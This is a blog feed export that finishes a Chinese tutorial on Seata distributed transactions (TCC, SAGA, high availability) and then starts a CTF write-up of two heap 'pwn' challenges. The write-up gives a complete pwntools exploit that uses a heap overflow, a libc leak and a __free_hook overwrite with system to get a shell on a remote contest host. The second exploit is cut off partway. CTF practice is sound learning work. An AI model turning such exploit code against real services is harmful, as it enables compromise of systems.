class="line"></span><br></pre></td></tr></table></figure><p>其中：</p><ul><li>xid：是全局事务id</li><li>freeze_money：用来记录用户冻结金额</li><li>state：用来记录事务状态</li></ul><p>那此时，我们的业务开怎么做呢？</p><ul><li>Try业务：<ul><li>记录冻结金额和事务状态到account_freeze表</li><li>扣减account表可用金额</li></ul></li><li>Confirm业务<ul><li>根据xid删除account_freeze表的冻结记录</li></ul></li><li>Cancel业务<ul><li>修改account_freeze表，冻结金额为0，state为2</li><li>修改account表，恢复可用金额</li></ul></li><li>如何判断是否空回滚？<ul><li>cancel业务中，根据xid查询account_freeze，如果为null则说明try还没做，需要空回滚</li></ul></li><li>如何避免业务悬挂？<ul><li>try业务中，根据xid查询account_freeze ，如果已经存在则证明Cancel已经执行，拒绝执行try业务</li></ul></li></ul><p>接下来，我们改造account-service，利用TCC实现余额扣减功能。</p><h4 id="2）声明TCC接口"><a href="#2）声明TCC接口" class="headerlink" title="2）声明TCC接口"></a>2）声明TCC接口</h4><p>TCC的Try、Confirm、Cancel方法都需要在接口中基于注解来声明，</p><p>我们在account-service项目中的<code>cn.itcast.account.service</code>包中新建一个接口，声明TCC三个接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.account.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> io.seata.rm.tcc.api.BusinessActionContext;</span><br><span class="line"><span class="keyword">import</span> io.seata.rm.tcc.api.BusinessActionContextParameter;</span><br><span class="line"><span class="keyword">import</span> io.seata.rm.tcc.api.LocalTCC;</span><br><span class="line"><span class="keyword">import</span> io.seata.rm.tcc.api.TwoPhaseBusinessAction;</span><br><span class="line"></span><br><span class="line"><span class="meta">@LocalTCC</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">AccountTCCService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@TwoPhaseBusinessAction(name = &quot;deduct&quot;, commitMethod = &quot;confirm&quot;, rollbackMethod = &quot;cancel&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">deduct</span><span class="params">(<span class="meta">@BusinessActionContextParameter(paramName = &quot;userId&quot;)</span> String userId,</span></span></span><br><span class="line"><span class="params"><span class="function">                <span class="meta">@BusinessActionContextParameter(paramName = &quot;money&quot;)</span><span class="keyword">int</span> money)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">confirm</span><span class="params">(BusinessActionContext ctx)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">cancel</span><span class="params">(BusinessActionContext ctx)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3）编写实现类"><a href="#3）编写实现类" class="headerlink" title="3）编写实现类"></a>3）编写实现类</h4><p>在account-service服务中的<code>cn.itcast.account.service.impl</code>包下新建一个类，实现TCC业务：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.account.service.impl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.itcast.account.entity.AccountFreeze;</span><br><span class="line"><span class="keyword">import</span> cn.itcast.account.mapper.AccountFreezeMapper;</span><br><span class="line"><span class="keyword">import</span> cn.itcast.account.mapper.AccountMapper;</span><br><span class="line"><span class="keyword">import</span> cn.itcast.account.service.AccountTCCService;</span><br><span class="line"><span class="keyword">import</span> io.seata.core.context.RootContext;</span><br><span class="line"><span class="keyword">import</span> io.seata.rm.tcc.api.BusinessActionContext;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"><span class="keyword">import</span> org.springframework.transaction.annotation.Transactional;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AccountTCCServiceImpl</span> <span class="keyword">implements</span> <span class="title">AccountTCCService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> AccountMapper accountMapper;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> AccountFreezeMapper freezeMapper;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">deduct</span><span class="params">(String userId, <span class="keyword">int</span> money)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 0.获取事务id</span></span><br><span class="line">        String xid = RootContext.getXID();</span><br><span class="line">        <span class="comment">// 1.扣减可用余额</span></span><br><span class="line">        accountMapper.deduct(userId, money);</span><br><span class="line">        <span class="comment">// 2.记录冻结金额，事务状态</span></span><br><span class="line">        AccountFreeze freeze = <span class="keyword">new</span> AccountFreeze();</span><br><span class="line">        freeze.setUserId(userId);</span><br><span class="line">        freeze.setFreezeMoney(money);</span><br><span class="line">        freeze.setState(AccountFreeze.State.TRY);</span><br><span class="line">        freeze.setXid(xid);</span><br><span class="line">        freezeMapper.insert(freeze);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">confirm</span><span class="params">(BusinessActionContext ctx)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 1.获取事务id</span></span><br><span class="line">        String xid = ctx.getXid();</span><br><span class="line">        <span class="comment">// 2.根据id删除冻结记录</span></span><br><span class="line">        <span class="keyword">int</span> count = freezeMapper.deleteById(xid);</span><br><span class="line">        <span class="keyword">return</span> count == <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">cancel</span><span class="params">(BusinessActionContext ctx)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 0.查询冻结记录</span></span><br><span class="line">        String xid = ctx.getXid();</span><br><span class="line">        AccountFreeze freeze = freezeMapper.selectById(xid);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1.恢复可用余额</span></span><br><span class="line">        accountMapper.refund(freeze.getUserId(), freeze.getFreezeMoney());</span><br><span class="line">        <span class="comment">// 2.将冻结金额清零，状态改为CANCEL</span></span><br><span class="line">        freeze.setFreezeMoney(<span class="number">0</span>);</span><br><span class="line">        freeze.setState(AccountFreeze.State.CANCEL);</span><br><span class="line">        <span class="keyword">int</span> count = freezeMapper.updateById(freeze);</span><br><span class="line">        <span class="keyword">return</span> count == <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4）空回滚和业务悬挂实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.account.service.impl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.itcast.account.entity.AccountFreeze;</span><br><span class="line"><span class="keyword">import</span> cn.itcast.account.mapper.AccountFreezeMapper;</span><br><span class="line"><span class="keyword">import</span> cn.itcast.account.mapper.AccountMapper;</span><br><span class="line"><span class="keyword">import</span> cn.itcast.account.service.AccountTCCService;</span><br><span class="line"><span class="keyword">import</span> io.seata.core.context.RootContext;</span><br><span class="line"><span class="keyword">import</span> io.seata.rm.tcc.api.BusinessActionContext;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"><span class="keyword">import</span> org.springframework.transaction.annotation.Transactional;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AccountTCCServiceImpl</span> <span class="keyword">implements</span> <span class="title">AccountTCCService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> AccountMapper accountMapper;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> AccountFreezeMapper freezeMapper;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">deduct</span><span class="params">(String userId, <span class="keyword">int</span> money)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 0.获取事务id</span></span><br><span class="line">        String xid = RootContext.getXID();</span><br><span class="line">        <span class="comment">// 查询freeze，防止业务悬挂</span></span><br><span class="line">        AccountFreeze oldFreeze = freezeMapper.selectById(xid);</span><br><span class="line">        <span class="keyword">if</span> (oldFreeze != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 拒绝业务</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1.扣减可用余额</span></span><br><span class="line">        accountMapper.deduct(userId, money);</span><br><span class="line">        <span class="comment">// 2.记录冻结金额，事务状态</span></span><br><span class="line">        AccountFreeze freeze = <span class="keyword">new</span> AccountFreeze();</span><br><span class="line">        freeze.setUserId(userId);</span><br><span class="line">        freeze.setFreezeMoney(money);</span><br><span class="line">        freeze.setState(AccountFreeze.State.TRY);</span><br><span class="line">        freeze.setXid(xid);</span><br><span class="line">        freezeMapper.insert(freeze);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">confirm</span><span class="params">(BusinessActionContext ctx)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 1.获取事务id</span></span><br><span class="line">        String xid = ctx.getXid();</span><br><span class="line">        <span class="comment">// 2.根据id删除冻结记录</span></span><br><span class="line">        <span class="keyword">int</span> count = freezeMapper.deleteById(xid);</span><br><span class="line">        <span class="keyword">return</span> count == <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">cancel</span><span class="params">(BusinessActionContext ctx)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 0.查询冻结记录</span></span><br><span class="line">        String xid = ctx.getXid();</span><br><span class="line">        String userId = ctx.getActionContext(<span class="string">&quot;userId&quot;</span>).toString();</span><br><span class="line"></span><br><span class="line">        AccountFreeze freeze = freezeMapper.selectById(xid);</span><br><span class="line">        <span class="comment">// 空回滚判断</span></span><br><span class="line">        <span class="keyword">if</span> (freeze == <span class="keyword">null</span>) &#123;</span><br><span class="line">            freeze = <span class="keyword">new</span> AccountFreeze();</span><br><span class="line">            freeze.setUserId(userId);</span><br><span class="line">            freeze.setFreezeMoney(<span class="number">0</span>);</span><br><span class="line">            freeze.setState(AccountFreeze.State.CANCEL);</span><br><span class="line">            freeze.setXid(xid);</span><br><span class="line">            freezeMapper.insert(freeze);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 幂等判断</span></span><br><span class="line">        <span class="keyword">if</span>(freeze.getState() == AccountFreeze.State.CANCEL)&#123;</span><br><span class="line">            <span class="comment">// 已经处理过了，无需重复cancel</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 1.恢复可用余额</span></span><br><span class="line">        accountMapper.refund(freeze.getUserId(), freeze.getFreezeMoney());</span><br><span class="line">        <span class="comment">// 2.将冻结金额清零，状态改为CANCEL</span></span><br><span class="line">        freeze.setFreezeMoney(<span class="number">0</span>);</span><br><span class="line">        freeze.setState(AccountFreeze.State.CANCEL);</span><br><span class="line">        <span class="keyword">int</span> count = freezeMapper.updateById(freeze);</span><br><span class="line">        <span class="keyword">return</span> count == <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-4-SAGA模式"><a href="#4-4-SAGA模式" class="headerlink" title="4.4.SAGA模式"></a>4.4.SAGA模式</h2><p>Saga 模式是 Seata 即将开源的长事务解决方案，将由蚂蚁金服主要贡献。</p><p>其理论基础是Hector &amp; Kenneth  在1987年发表的论文<a href="https://microservices.io/patterns/data/saga.html">Sagas</a>。</p><p>Seata官网对于Saga的指南：<a href="https://seata.io/zh-cn/docs/user/saga.html">https://seata.io/zh-cn/docs/user/saga.html</a></p><h3 id="4-4-1-原理"><a href="#4-4-1-原理" class="headerlink" title="4.4.1.原理"></a>4.4.1.原理</h3><p>在 Saga 模式下，分布式事务内有多个参与者，每一个参与者都是一个冲正补偿服务，需要用户根据业务场景实现其正向操作和逆向回滚操作。</p><p>分布式事务执行过程中，依次执行各参与者的正向操作，如果所有正向操作均执行成功，那么分布式事务提交。如果任何一个正向操作执行失败，那么分布式事务会去退回去执行前面各参与者的逆向回滚操作，回滚已提交的参与者，使分布式事务回到初始状态。</p><p><img src="https://gitee.com/zephyr-cyper/hexo-files/raw/master/img/Snipaste_2022-12-14_20-38-49.png"></p><p>Saga也分为两个阶段：</p><ul><li>一阶段：直接提交本地事务</li><li>二阶段：成功则什么都不做；失败则通过编写补偿业务来回滚</li></ul><h3 id="4-4-2-优缺点"><a href="#4-4-2-优缺点" class="headerlink" title="4.4.2.优缺点"></a>4.4.2.优缺点</h3><p>优点：</p><ul><li>事务参与者可以基于事件驱动实现异步调用，吞吐高</li><li>一阶段直接提交事务，无锁，性能好</li><li>不用编写TCC中的三个阶段，实现简单</li></ul><p>缺点：</p><ul><li>软状态持续时间不确定，时效性差</li><li>没有锁，没有事务隔离，会有脏写</li></ul><h2 id="4-5-四种模式对比"><a href="#4-5-四种模式对比" class="headerlink" title="4.5.四种模式对比"></a>4.5.四种模式对比</h2><p>我们从以下几个方面来对比四种实现：</p><ul><li>一致性：能否保证事务的一致性？强一致还是最终一致？</li><li>隔离性：事务之间的隔离性如何？</li><li>代码侵入：是否需要对业务代码改造？</li><li>性能：有无性能损耗？</li><li>场景：常见的业务场景</li></ul><p>如图：</p><p><img src="https://gitee.com/zephyr-cyper/hexo-files/raw/master/img/Snipaste_2022-12-14_20-38-54.png"></p><h1 id="5-高可用"><a href="#5-高可用" class="headerlink" title="5.高可用"></a>5.高可用</h1><p>Seata的TC服务作为分布式事务核心，一定要保证集群的高可用性。</p><h2 id="5-1-高可用架构模型"><a href="#5-1-高可用架构模型" class="headerlink" title="5.1.高可用架构模型"></a>5.1.高可用架构模型</h2><p>搭建TC服务集群非常简单，启动多个TC服务，注册到nacos即可。</p><p>但集群并不能确保100%安全，万一集群所在机房故障怎么办？所以如果要求较高，一般都会做异地多机房容灾。</p><p>比如一个TC集群在上海，另一个TC集群在杭州：</p><p><img src="https://gitee.com/zephyr-cyper/hexo-files/raw/master/img/Snipaste_2022-12-14_20-39-00.png"></p><p>微服务基于事务组（tx-service-group)与TC集群的映射关系，来查找当前应该使用哪个TC集群。当SH集群故障时，只需要将vgroup-mapping中的映射关系改成HZ。则所有微服务就会切换到HZ的TC集群了。</p><h2 id="5-2-实现高可用"><a href="#5-2-实现高可用" class="headerlink" title="5.2.实现高可用"></a>5.2.实现高可用</h2><p>第三章节：</p><p><img src="https://gitee.com/zephyr-cyper/hexo-files/raw/master/img/Snipaste_2022-12-14_20-39-06.png"></p>]]></content>
      
      
      <categories>
          
          <category> Java那点事 </category>
          
          <category> 练手项目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java那点事 </tag>
            
            <tag> 练手项目 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwn2</title>
      <link href="/bufferfly/blog/2287909314.html"/>
      <url>/bufferfly/blog/2287909314.html</url>
      
        <content type="html"><![CDATA[<h1 id="记录两个堆的比赛题"><a href="#记录两个堆的比赛题" class="headerlink" title="记录两个堆的比赛题"></a>记录两个堆的比赛题</h1><p>比较穷网盘没有会员附件私聊我</p><h1 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h1><p><img src="/img/PWN/zhiye2.png" alt="avatar"></p><p><img src="/img/PWN/zhiye.png" alt="avatar"><br>堆溢出<br>感觉比较基础<br>堆溢出改大小制造重叠堆块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn1&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;119.61.19.212&#x27;</span>,<span class="number">57511</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="comment">#libc=elf.libc</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">context</span>):</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;content: &#x27;</span>,context)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">index</span>):</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">add(<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x481</span>))</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">malloc_hook=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">96</span>-<span class="number">16</span></span><br><span class="line">libc_base=malloc_hook-libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base&#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>)<span class="comment">#10</span></span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span>+p64(<span class="number">0</span>)+p64(<span class="number">91</span>)+p64(free_hook-<span class="number">8</span>))<span class="comment">#1</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(system))<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">io.interactive()</span><br><span class="line">exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h1><p>比赛就两小时<br>想办法绕过这有点麻烦<br><img src="/img/PWN/zhiye3.png" alt="avatar"><br>最后复现出来<br>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">&#x27;./pwn2&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn2&#x27;</span>)</span><br><span class="line">libc=elf.libc</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">index</span>):</span></span><br><span class="line">io.sendlineafter(<span 